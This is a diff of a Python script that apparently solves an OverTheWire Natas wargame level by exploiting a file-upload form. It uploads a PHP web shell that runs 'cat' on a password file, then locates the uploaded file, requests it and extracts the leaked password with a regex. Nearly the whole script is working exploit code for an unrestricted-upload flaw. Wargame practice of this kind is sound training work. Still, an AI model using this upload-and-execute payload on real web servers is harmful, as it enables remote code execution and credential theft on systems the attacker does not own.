@@ -11,11 +11,10 @@ proxies = {
     'http': 'http://127.0.0.1:6996',
     'https': 'http://127.0.0.1:6996',
 }
-files = {'file':open('C:\\Users\\djohnston\\Documents\\Natas\\Overthewire\\natas12.php', 'rb')}
 fields = {
     'MAX_FILE_SIZE': ('1000'),
-    'filename': '7og15crnxx.php',
-    'uploadedfile': '<?php echo exec("cat /etc/natas_webpass/natas13"); ?>',
+    'filename': 'zpxzxbzdzp.php',
+    'uploadedfile': ('Content-Type: application/octet-stream', '<?php echo exec("cat /etc/natas_webpass/natas13"); ?>'),
 }
 
 def initialRequest():
@@ -37,14 +36,23 @@ def sourceRequest():  # shows 'include "includes/secret.inc";'
 
 def uploadRequest():
     session = requests.Session()
-    m = MultipartEncoder(fields, boundary='---------------------------57052814523281')
+    m = MultipartEncoder(fields, boundary='----------------------------7140251896146')
     resp3 = session.post(url, auth=(username, password), headers={'Content-Type': m.content_type}, data=m.to_string(), proxies=proxies)
     content = resp3.text
-    print(content)
+    #print(content)
+    soup = BeautifulSoup(content, 'html.parser')
+    path = soup.find('a')['href']
+    print(path)
+    return path
 
-
+def fileRequest(file):
+    session = requests.Session()
+    resp4 = session.get(url + '/' + filePath, auth=(username, password))
+    regex = re.findall("\w{32}", resp4.text)
+    print(str(regex)[2:34])
 
 viewSource = initialRequest()
 sourceRequest()
-uploadRequest()
+filePath = uploadRequest()
+fileRequest(filePath)
 
